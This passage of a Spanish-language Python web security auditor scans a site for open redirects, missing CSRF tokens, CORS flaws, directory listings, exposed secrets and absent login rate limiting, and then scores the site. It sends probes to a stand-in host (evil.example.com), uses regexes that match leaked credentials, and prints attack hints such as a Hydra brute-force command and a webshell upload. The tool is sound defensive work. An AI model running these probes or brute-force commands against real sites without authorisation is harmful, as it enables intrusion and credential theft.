                url_rd = f"{base_path}?{urllib.parse.urlencode(pt_rd)}"
                try:
                    r_rd = requests.get(url_rd, timeout=7, verify=False,
                                        headers=dict(self.session.headers),
                                        allow_redirects=False)
                    if r_rd and r_rd.status_code in (301, 302, 303, 307, 308):
                        loc = r_rd.headers.get("Location", "")
                        if "evil.example.com" in loc:
                            ya_reportado.add(key_rd)
                            print(f"\n      {Fore.BLUE+Style.BRIGHT}  ┌─ TERMINAL: Open Redirect ──────────────────────────{Style.RESET_ALL}")
                            print(f"      {Fore.RED}  │ ❌ HTTP {r_rd.status_code} → Location: {loc}{Style.RESET_ALL}")
                            print(f"      {Fore.RED}  │    Redirige a cualquier dominio → VULNERABLE{Style.RESET_ALL}")
                            print(f"      {Fore.BLUE}  └────────────────────────────────────────────────{Style.RESET_ALL}")
                            res("ALTA", f"¡Open Redirect! parámetro '{param}'",
                                ataque=f"URL de phishing con dominio legítimo:\n"
                                       f"  {base_path}?{param}=https://banco-falso.com\n"
                                       "La víctima confía porque la URL empieza con el dominio real.",
                                defensa="Usa solo rutas relativas para redirecciones internas.\n"
                                        "Si necesitas URLs externas, implementa una whitelist explícita.",
                                url_origen=page_url)
                            self._reg(f"Open Redirect — {param}", "ALTA",
                                      f"'{param}' en {page_url} redirige a cualquier URL.",
                                      "Whitelist de dominios. Rutas relativas.",
                                      f"curl -I '{url_rd}' | grep -i location",
                                      "Phishing con dominio legítimo como punto de entrada.",
                                      "Whitelist explícita de dominios permitidos.",
                                      url_origen=page_url)
                except Exception:
                    pass

    # ── 3.7 FORMULARIOS ──────────────────────────────────────────
    def verificar_formularios(self):
        sub("3.7 Formularios y protecciones")
        tokens_csrf=["csrf","_token","authenticity_token","__requestverificationtoken",
                     "nonce","_wpnonce","csrfmiddlewaretoken"]
        ya_rep = set()

        for page_url, page_r in self.pages.items():
            if not page_r: continue
            html = page_r.text or ""
            forms = re.findall(r"(<form[^>]*>)(.*?)</form>",html,re.S|re.I)
            if not forms: continue

            for i,(tag,body) in enumerate(forms,1):
                mm=re.search(r'method=["\']?(\w+)',tag,re.I)
                am=re.search(r'action=["\']([^"\']+)',tag,re.I)
                method=mm.group(1).upper() if mm else "GET"
                action=am.group(1) if am else ""

                if method=="GET" and re.search(r'type=["\']?password',body,re.I):
                    res("CRITICA",f"¡Password en GET! Form {i}",
                        ataque="Contraseña visible en URL → logs del servidor, historial, Referer.",
                        defensa="Cambia method='GET' a method='POST'",url_origen=page_url)
                    self._reg(f"Password en GET (form {i})","CRITICA",
                              "Contraseña en URL.",
                              "method='POST'","Enviar form y ver URL resultante",
                              "Contraseña en logs y Referer.",
                              "method='POST' siempre.",url_origen=page_url)

                if method=="POST":
                    key=f"{page_url}_{i}"
                    tiene_csrf=any(re.search(rf'name=["\']?{t}',body,re.I) for t in tokens_csrf)
                    if not tiene_csrf and key not in ya_rep:
                        ya_rep.add(key)
                        print(f"\n      {Fore.BLUE+Style.BRIGHT}  ┌─ TERMINAL: verificando CSRF en form {i} ─────────{Style.RESET_ALL}")
                        if self.vt.CURL_OK:
                            cmd=["curl","-s","--max-time","8","--insecure",page_url]
                            _,out,_=self.vt.ejecutar(cmd)
                            tok_found=any(t in out.lower() for t in tokens_csrf)
                            if tok_found:
                                print(f"      {Fore.GREEN}  │ ✅ Token CSRF encontrado en el HTML{Style.RESET_ALL}")
                            else:
                                print(f"      {Fore.RED}  │ ❌ SIN token CSRF → formulario POST desprotegido{Style.RESET_ALL}")
                                print(f"      {Fore.RED}  │    No se encontró ningún campo: csrf/_token/nonce{Style.RESET_ALL}")
                        print(f"      {Fore.BLUE}  └────────────────────────────────────────────────{Style.RESET_ALL}")
                        res("ALTA",f"Sin token CSRF — Form {i}",
                            ataque="CSRF: formulario malicioso en sitio externo envía datos con la sesión de la víctima.",
                            defensa="Django: {% csrf_token %}\nLaravel: @csrf\nRails: protect_from_forgery",
                            url_origen=page_url)
                        self._reg(f"Sin CSRF (form {i})","ALTA",
                                  f"Form POST sin token CSRF en {page_url}",
                                  "Token CSRF único por sesión.",
                                  f"curl -s {page_url} | grep -i csrf",
                                  "CSRF.",
                                  "Token CSRF + SameSite=Strict.",url_origen=page_url)

                if re.search(r'type=["\']?file',body,re.I):
                    if not re.search(r'accept=["\']',body,re.I):
                        res("MEDIA",f"Upload sin restricción — Form {i}",
                            ataque="Subir shell.php → ejecución de comandos en el servidor (RCE).",
                            defensa="Validar MIME en backend. Guardar fuera del webroot.",
                            url_origen=page_url)
                        self._reg(f"Upload sin restricción (form {i})","MEDIA",
                                  f"Upload sin validación en {page_url}",
                                  "Validar MIME en backend + fuera del webroot.",
                                  f"Subir .php y acceder a la URL",
                                  "RCE mediante webshell.",
                                  "Validación MIME + sin ejecución PHP en /uploads.",
                                  url_origen=page_url)

    # ── 3.8 CORS ─────────────────────────────────────────────────
    def verificar_cors(self):
        sub("3.8 CORS y control de acceso")
        self.vt.verificar_cors_terminal(self.url)
        r_cors=self._get("/",extra_headers={"Origin":"https://evil.example.com"})
        if r_cors:
            acao=r_cors.headers.get("Access-Control-Allow-Origin","")
            acac=r_cors.headers.get("Access-Control-Allow-Credentials","")
            if acao and (acao=="*" or "evil.example.com" in acao):
                nivel="CRITICA" if "true" in acac.lower() and acao!="*" else "MEDIA"
                res(nivel,f"CORS vulnerable: ACAO={acao} ACAC={acac}",
                    ataque="fetch() cross-origin con credenciales → robo de datos del usuario autenticado.",
                    defensa="Whitelist explícita. Nunca credentials=true con origen dinámico.",
                    url_origen=self.url)
                self._reg("CORS mal configurado",nivel,
                          f"ACAO={acao} / ACAC={acac}",
                          "Whitelist de orígenes.",
                          f"curl -I {self.url} -H 'Origin: https://evil.example.com'",
                          "Robo cross-origin de datos autenticados.",
                          "Whitelist + nunca credentials con origen dinámico.",
                          url_origen=self.url)

        self.vt.verificar_metodos_terminal(self.url)

        # Directory listing
        for d in ["/uploads/","/backup/","/files/","/api/","/logs/"]:
            r=self._get(d)
            if r and r.status_code==200:
                if re.search(r"index of|directory listing|parent directory",r.text or "",re.I):
                    url_dir=f"{self.base}{d}"
                    res("ALTA",f"Directory listing: {d}",
                        ataque="Descarga directa de todos los archivos del directorio.",
                        defensa="Nginx: autoindex off;",url_origen=url_dir)
                    self._reg(f"Directory listing: {d}","ALTA",
                              f"Directorio {d} lista su contenido.",
                              "autoindex off;",
                              f"curl -s {url_dir} | grep -i 'index of'",
                              "Descarga de webshells, dumps, logs.",
                              "autoindex off + index.html vacío.",url_origen=url_dir)

    # ── 3.9 INFORMACIÓN SENSIBLE ──────────────────────────────────
    def verificar_info_sensible(self):
        sub("3.9 Información sensible en código fuente")
        patrones=[
            (r"(?i)api[_-]?key[\"'\s:=]+([A-Za-z0-9_\-]{20,})","API Key"),
            (r"(AKI[A-Z0-9]{20})","AWS Access Key ID"),
            (r"-----BEGIN (?:RSA |EC )?PRIVATE KEY-----","Clave Privada PEM"),
            (r"(?i)(?:db_|database_)?password[\"'\s:=]+[\"']([^\"']{6,})[\"']","Password"),
            (r"sk-[A-Za-z0-9]{48}","OpenAI API Key"),
            (r"xox[baprs]-[A-Za-z0-9-]{10,}","Slack Token"),
        ]
        ya_rep=set()
        for page_url, page_r in self.pages.items():
            if not page_r: continue
            html=page_r.text or ""
            for patron,nombre in patrones:
                m=re.search(patron,html)
                if m:
                    found=m.group(0)[:60]
                    if found not in ya_rep:
                        ya_rep.add(found)
                        res("CRITICA",f"¡{nombre} en código fuente!",
                            f"Fragmento: {found}...",
                            ataque="ROTA LA CLAVE INMEDIATAMENTE.\n"
                                   "AWS: acceso a toda la infraestructura.\n"
                                   "Stripe: pagos y datos de tarjetas.",
                            defensa="Variables de entorno. git-secrets. Rotar clave.",
                            url_origen=page_url)
                        self._reg(f"{nombre} expuesta","CRITICA",
                                  f"{nombre} en {page_url}: '{found}'",
                                  "ROTA. Variables de entorno.",
                                  "DevTools → Sources → Ctrl+F",
                                  "Acceso no autorizado a servicios.",
                                  "Rotar + vault.",url_origen=page_url)
            # IPs privadas
            ips=list(set(re.findall(
                r"\b(10\.\d+\.\d+\.\d+|172\.(?:1[6-9]|2\d|3[01])\.\d+\.\d+|192\.168\.\d+\.\d+)\b",html)))
            for ip in ips[:2]:
                if ip not in ya_rep:
                    ya_rep.add(ip)
                    res("MEDIA",f"IP interna expuesta: {ip}",
                        ataque="Reconocimiento de red interna para pivoting.",
                        defensa="Elimina referencias a IPs internas.",url_origen=page_url)

    # ── 3.10 RATE LIMITING ────────────────────────────────────────
    def verificar_rate_limiting(self):
        sub("3.10 Rate limiting en login")
        login_paths=["/login","/wp-login.php","/admin/login","/signin","/auth/login"]
        login_url=None
        for path in login_paths:
            r=self._get(path,redir=True)
            if r and r.status_code==200:
                login_url=path; break
        if not login_url:
            res("INFO","Endpoint de login estándar no encontrado"); return

        res("INFO",f"Login detectado: {login_url}")
        print(f"\n      {Fore.BLUE+Style.BRIGHT}  ┌─ TERMINAL: probando rate limiting ──────────────{Style.RESET_ALL}")
        codes=[]
        for intento in range(5):
            try:
                r=requests.post(urljoin(self.base,login_url),
                                data={"username":"admin","password":f"wrongpass{intento}",
                                      "email":"admin@test.com"},
                                timeout=5,verify=False,
                                headers=dict(self.session.headers),allow_redirects=False)
                codes.append(r.status_code)
                print(f"      {'  │ '}Intento {intento+1}: HTTP {r.status_code}")
            except Exception:
                codes.append(0)

        if codes and all(c in (200,302,400,401,422) for c in codes if c):
            print(f"      {Fore.RED}  │ ❌ Todos los intentos devuelven el mismo código{Style.RESET_ALL}")
            print(f"      {Fore.RED}  │    Sin bloqueo ni CAPTCHA → SIN RATE LIMITING{Style.RESET_ALL}")
            print(f"      {Fore.BLUE}  └────────────────────────────────────────────────{Style.RESET_ALL}")
            res("MEDIA","Sin rate limiting en login",
                f"5 intentos erróneos → códigos: {codes}",
                ataque="Hydra: hydra -l admin -P rockyou.txt http-post-form\n"
                       f"  '{login_url}:username=^USER^&password=^PASS^:F=incorrect'\n"
                       "Credential stuffing con bases filtradas de dehashed.com",
                defensa="CAPTCHA tras 3-5 fallos. Bloqueo temporal. 2FA. Alertas de IP nueva.",
                url_origen=f"{self.base}{login_url}")
            self._reg("Sin rate limiting","MEDIA",
                      f"Login en {self.base}{login_url} sin protección.",
                      "CAPTCHA + lockout + rate limiting + 2FA.",
                      f"5+ intentos erróneos sin bloqueo",
                      "Hydra + credential stuffing.",
                      "CAPTCHA + 2FA + alertas.",url_origen=f"{self.base}{login_url}")
        else:
            print(f"      {Fore.GREEN}  │ ✅ Posible protección detectada (códigos variaron){Style.RESET_ALL}")
            print(f"      {Fore.BLUE}  └────────────────────────────────────────────────{Style.RESET_ALL}")
            res("OK",f"Posible rate limiting activo (códigos: {set(codes)})")

    def generar_informe(self):
        duracion=time.time()-self.t0
        titulo("INFORME FINAL DE AUDITORÍA")
        print(f"  URL          : {Fore.CYAN}{self.url}{Style.RESET_ALL}")
        print(f"  Páginas HTML : {Fore.CYAN}{len(self.pages)}{Style.RESET_ALL}")
        print(f"  Fecha        : {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        print(f"  Duración     : {duracion:.1f}s")
        print(f"  Versión      : v{VERSION}")

        conteos={}
        for v in self.vulns:
            conteos[v["nivel"]]=conteos.get(v["nivel"],0)+1
        orden=["CRITICA","ALTA","MEDIA","BAJA","INFO"]
        print(f"\n{Fore.WHITE+Style.BRIGHT}  Resumen:{Style.RESET_ALL}")
        for nv in orden:
            n=conteos.get(nv,0)
            if n: print(f"    {ico(nv)} {col(nv)}{nv}: {n}{Style.RESET_ALL}")
        print(f"\n  Total: {Fore.YELLOW+Style.BRIGHT}{len(self.vulns)}{Style.RESET_ALL} hallazgos")

        if not self.vulns:
            print(f"\n  {Fore.GREEN+Style.BRIGHT}✅ Sin vulnerabilidades significativas{Style.RESET_ALL}")
            return

        titulo("VULNERABILIDADES POR URL")
        por_url=defaultdict(list)
        sin_url=[]
        for v in self.vulns:
            if v.get("url_origen"): por_url[v["url_origen"]].append(v)
            else: sin_url.append(v)

        if sin_url:
            print(f"\n  {Fore.CYAN+Style.BRIGHT}◆ INFRAESTRUCTURA{Style.RESET_ALL}")
            self._imp(sin_url)
        for url_o,vulns_u in sorted(por_url.items()):
            print(f"\n  {Fore.CYAN+Style.BRIGHT}◆ {url_o}{Style.RESET_ALL}")
            self._imp(vulns_u)

        self._punt(conteos)

    def _imp(self,lista):
        orden=["CRITICA","ALTA","MEDIA","BAJA","INFO"]
        for nv in orden:
            for v in [x for x in lista if x["nivel"]==nv]:
                c_=col(nv); i_=ico(nv)
                print(f"\n    {i_} {c_+Style.BRIGHT}[{nv}] {v['nombre']}{Style.RESET_ALL}")
                print(f"    {'─'*65}")
                if v.get("descripcion"):
                    print(f"    {Fore.WHITE+Style.BRIGHT}Descripción:{Style.RESET_ALL}")
                    for ln in v['descripcion'].split("\n"):
                        print(f"      {Fore.WHITE+Style.DIM}{ln}{Style.RESET_ALL}")
                if v.get("vector_ataque"):
                    print(f"    {Fore.RED+Style.BRIGHT}⚔  Vector de ataque:{Style.RESET_ALL}")
                    for ln in v['vector_ataque'].split("\n"):
                        print(f"      {Fore.RED+Style.DIM}{ln}{Style.RESET_ALL}")
                if v.get("verificacion_manual"):
                    print(f"    {Fore.BLUE+Style.BRIGHT}🔍 Verificación:{Style.RESET_ALL}")
                    for ln in v['verificacion_manual'].split("\n"):
                        print(f"      {Fore.BLUE+Style.DIM}{ln}{Style.RESET_ALL}")
                print(f"    {Fore.GREEN+Style.BRIGHT}🛡  Solución:{Style.RESET_ALL}")
                for ln in v.get('solucion','').split("\n"):
                    print(f"      {Fore.GREEN}{ln}{Style.RESET_ALL}")
                if v.get("defensa") and v['defensa']!=v.get('solucion',''):
                    for ln in v['defensa'].split("\n"):
                        print(f"      {Fore.GREEN+Style.DIM}{ln}{Style.RESET_ALL}")

    def _punt(self,conteos):
        pesos={"CRITICA":25,"ALTA":10,"MEDIA":5,"BAJA":1}
        score=max(0,100-sum(conteos.get(k,0)*p for k,p in pesos.items()))
        if score>=85:   e,nv="Excelente 🏆","OK"
        elif score>=70: e,nv="Bueno ✓","OK"
        elif score>=50: e,nv="Moderado ⚠️","MEDIA"
        elif score>=30: e,nv="Deficiente ❌","ALTA"
        else:           e,nv="Crítico ☠️","CRITICA"
        c_=col(nv)
        titulo(f"PUNTUACIÓN: {c_}{score}/100 — {e}{Style.RESET_ALL}")
        barra=f"{c_}{'█'*(score//5)}{Style.RESET_ALL}{'░'*(20-score//5)}"
        print(f"  [{barra}]\n")

    def exportar_json(self,ruta):
        datos={"url":self.url,"fecha":datetime.datetime.now().isoformat(),
               "version":VERSION,"paginas":list(self.pages.keys()),
               "vulnerabilidades":self.vulns,"total":len(self.vulns)}
        with open(ruta,"w",encoding="utf-8") as f:
            json.dump(datos,f,ensure_ascii=False,indent=2)
        print(f"\n  📄 JSON: {ruta}")

    def ejecutar(self):
        titulo(f"AUDITORÍA DE CIBERSEGURIDAD WEB v{VERSION}")
        print(f"  Objetivo    : {Fore.CYAN+Style.BRIGHT}{self.url}{Style.RESET_ALL}")
        print(f"  Inicio      : {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        print(f"  Máx. páginas: {self.max_pages}")
        print(f"  Nmap        : {'sí' if self.run_nmap else 'no (--no-nmap)'}")
        print(f"  curl        : {'disponible ✓' if self.vt.CURL_OK else 'NO instalado'}")
        print(f"  openssl     : {'disponible ✓' if self.vt.OPENSSL else 'NO instalado'}")
        if not DNS_OK:
            print(f"  {Fore.YELLOW}⚠ pip install dnspython{Style.RESET_ALL}")

        self.fase_crawling()
        if self.run_nmap:
            self.fase_nmap()
        self.fase_analisis()
        self.verificar_ssl()
        self.verificar_cabeceras()
        self.verificar_cookies()
        self.verificar_dns()
        self.verificar_rutas_sensibles()
        self.verificar_inyecciones()
        self.verificar_formularios()
        self.verificar_cors()
        self.verificar_info_sensible()
        self.verificar_rate_limiting()
        self.generar_informe()


def main():
    parser=argparse.ArgumentParser(
        description=f"Auditor de Ciberseguridad Web v{VERSION}",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Ejemplos:
  python auditoria_seguridad.py
  python auditoria_seguridad.py --url https://miweb.com
  python auditoria_seguridad.py --url https://miweb.com --max-pages 50
  python auditoria_seguridad.py --url https://miweb.com --no-nmap --output informe.json

Herramientas recomendadas:
  pip install requests dnspython colorama
  sudo apt install nmap curl openssl

⚠  AVISO LEGAL: Solo para uso en sistemas propios o con autorización
   escrita. Acceso no autorizado → Código Penal art. 197 bis (España).
        """)
    parser.add_argument("--url",help="URL objetivo")
    parser.add_argument("--output",help="Guardar informe JSON")
    parser.add_argument("--max-pages",type=int,default=MAX_PAGES,
                        help=f"Máximo páginas a rastrear (defecto: {MAX_PAGES})")
    parser.add_argument("--no-nmap",action="store_true",help="Omitir nmap")
    args=parser.parse_args()

    print(f"\n{Fore.CYAN+Style.BRIGHT}{'═'*72}")
    print("  ██████╗██╗   ██╗██████╗ ███████╗██████╗    ██╗   ██╗ ██████╗")
    print("  ██╔════╝╚██╗ ██╔╝██╔══██╗██╔════╝██╔══██╗   ██║   ██║██╔════╝")
    print("  ██║      ╚████╔╝ ██████╔╝█████╗  ██████╔╝   ██║   ██║███████╗")
    print("  ██║       ╚██╔╝  ██╔══██╗██╔══╝  ██╔══██╗   ╚██╗ ██╔╝╚════██║")
    print("  ╚██████╗   ██║   ██████╔╝███████╗██║  ██║    ╚████╔╝ ███████║")
    print("   ╚═════╝   ╚═╝   ╚═════╝ ╚══════╝╚═╝  ╚═╝     ╚═══╝  ╚══════╝")
    print(f"  HTML-only Crawler · Terminal automático · SQLi · Nmap")
    print(f"  ⚠️  Solo para uso autorizado — CP art. 197 bis")
    print(f"{'═'*72}{Style.RESET_ALL}\n")

    url=args.url
    if not url:
        print(f"{Fore.YELLOW}URL a auditar (ej: https://tudominio.com):{Style.RESET_ALL}")
        url=input("  URL: ").strip()
    if not url:
        print(f"{Fore.RED}Error: URL requerida.{Style.RESET_ALL}"); sys.exit(1)

    auditor=AuditorSeguridad(url, max_pages=args.max_pages, run_nmap=not args.no_nmap)
    auditor.ejecutar()
    if args.output:
        auditor.exportar_json(args.output)

if __name__=="__main__":
    main()
